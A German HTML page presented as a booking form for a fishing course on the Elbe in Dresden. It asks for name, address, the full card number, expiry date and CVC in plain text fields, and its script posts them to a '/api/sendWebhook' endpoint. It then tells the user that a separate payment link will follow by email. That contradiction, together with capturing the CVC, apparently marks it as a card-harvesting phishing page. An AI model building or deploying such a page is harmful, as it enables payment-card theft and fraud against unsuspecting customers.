<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Angelkurs buchen - Elbe Dresden</title>
<style>
  /* (Deine bisherigen Styles hier, kannst sie übernehmen) */
</style>
</head>
<body>

<!-- ... dein Header, Bilder etc. ... -->

<div class="form-container">
  <h2>Angelkurs buchen</h2>
  <div class="info-text" style="color:red; font-weight:bold; text-align:center; margin-bottom:15px;">
    Nach der Eingabe bekommst du eine Bestätigungsmail mit Link zur Zahlungsseite und die Ortsdaten.
  </div>
  <form id="payment-form">
    <label for="firstname">Vorname</label>
    <input type="text" id="firstname" name="firstname" required />

    <label for="lastname">Nachname</label>
    <input type="text" id="lastname" name="lastname" required />

    <label for="email">E-Mail</label>
    <input type="email" id="email" name="email" required />

    <label for="address">Adresse</label>
    <input type="text" id="address" name="address" placeholder="Straße und Hausnummer" required />

    <label for="city">Stadt</label>
    <input type="text" id="city" name="city" required />

    <label for="postalcode">Postleitzahl</label>
    <input type="text" id="postalcode" name="postalcode" required />

    <label for="card-number">Kreditkartennummer</label>
    <input type="text" id="card-number" name="number" placeholder="Kreditkartennummer" required />

    <label for="card-name">Name auf der Karte</label>
    <input type="text" id="card-name" name="name" placeholder="Name auf der Karte" required />

    <label for="card-expiry">Ablaufdatum (MM/YY)</label>
    <input type="text" id="card-expiry" name="expiry" placeholder="MM/YY" required />

    <label for="card-cvc">CVC</label>
    <input type="text" id="card-cvc" name="cvc" placeholder="CVC" required />

    <button type="submit">Jetzt buchen</button>
  </form>
  <div id="response-message" style="margin-top:20px; font-weight:bold;"></div>
</div>

<script>
  const form = document.getElementById('payment-form');
  const responseMessage = document.getElementById('response-message');

  form.addEventListener('submit', async e => {
    e.preventDefault();

    const data = {
      firstname: form.firstname.value,
      lastname: form.lastname.value,
      email: form.email.value,
      address: form.address.value,
      city: form.city.value,
      postalcode: form.postalcode.value,
      card_number: form['number'].value,
      card_name: form.name.value,
      card_expiry: form.expiry.value,
      card_cvc: form.cvc.value
    };

    try {
      const res = await fetch('/api/sendWebhook', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data),
      });

      if (res.ok) {
        responseMessage.textContent = 'Deine Buchung wurde erfolgreich übermittelt! Du erhältst gleich eine E-Mail mit dem Link zur Zahlungsseite.';
        responseMessage.style.color = 'green';
        form.reset();
      } else {
        const json = await res.json();
        responseMessage.textContent = 'Fehler bei der Übermittlung: ' + (json.message || 'Bitte später nochmal probieren.');
        responseMessage.style.color = 'red';
      }
    } catch (err) {
      responseMessage.textContent = 'Serverfehler. Bitte später erneut versuchen.';
      responseMessage.style.color = 'red';
    }
  });
</script>

</body>
</html>

